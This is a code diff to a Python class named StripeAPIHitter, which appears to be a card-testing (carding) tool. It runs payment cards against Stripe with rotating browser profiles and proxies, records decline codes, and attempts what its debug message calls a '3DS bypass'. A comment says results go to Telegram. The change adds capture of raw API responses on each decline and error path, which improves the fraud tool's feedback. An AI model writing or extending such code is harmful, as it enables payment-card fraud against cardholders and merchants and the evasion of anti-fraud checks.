@@ -902,7 +902,7 @@ class StripeAPIHitter:
 
     async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None) -> Dict:
         start = time.time()
-        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
+        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None, 'raw_response': None}
         
         BROWSER_PROFILES = [
             {
@@ -1141,6 +1141,7 @@ class StripeAPIHitter:
                     err = pm_json.get('error', {})
                     result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'pm_token_failed')
                     result['error'] = err.get('message', 'Failed to generate payment method token')
+                    result['raw_response'] = pm_json
                     # If we reach here without exception, do not retry!
                     return result
                     
@@ -1296,12 +1297,14 @@ class StripeAPIHitter:
                         err = pi.get('last_payment_error')
                         result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                         result['error'] = err.get('message', 'Unknown error')
+                        result['raw_response'] = confirm_json
                         return result
                         
                     if isinstance(si, dict) and si.get('last_setup_error'):
                         err = si.get('last_setup_error')
                         result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                         result['error'] = err.get('message', 'Unknown error')
+                        result['raw_response'] = confirm_json
                         return result
     
                     status = confirm_json.get('status')
@@ -1508,6 +1511,7 @@ class StripeAPIHitter:
                                     else:
                                         result['decline_code'] = status_2 or '3ds_unknown'
                                         result['error'] = f"3ds_challenge_unresolved"
+                                    result['raw_response'] = poll_json
                                     return result
                         except Exception as ex:
                             print(f"DEBUG: 3DS bypass failed: {ex}")
@@ -1516,21 +1520,26 @@ class StripeAPIHitter:
                     elif status == 'requires_payment_method':
                         result['decline_code'] = 'generic_decline'
                         result['error'] = 'requires_payment_method'
+                        result['raw_response'] = confirm_json
                     elif status == 'open':
                         err = confirm_json.get('error')
                         if isinstance(err, dict):
                             result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                             result['error'] = err.get('message', 'Unknown error')
+                            result['raw_response'] = confirm_json
                             return result
                         
                         result['decline_code'] = 'open'
                         result['error'] = str(confirm_json)[:500]  # Dump the JSON to telegram so we can see what's actually there
+                        result['raw_response'] = confirm_json
                     else:
                         result['decline_code'] = status
+                        result['raw_response'] = confirm_json
                 else:
                     err = confirm_json.get('error', {})
                     result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'unknown')
                     result['error'] = err.get('message', 'Unknown error')
+                    result['raw_response'] = confirm_json
                     
                 # If we reach here without exception, do not retry!
                 return result
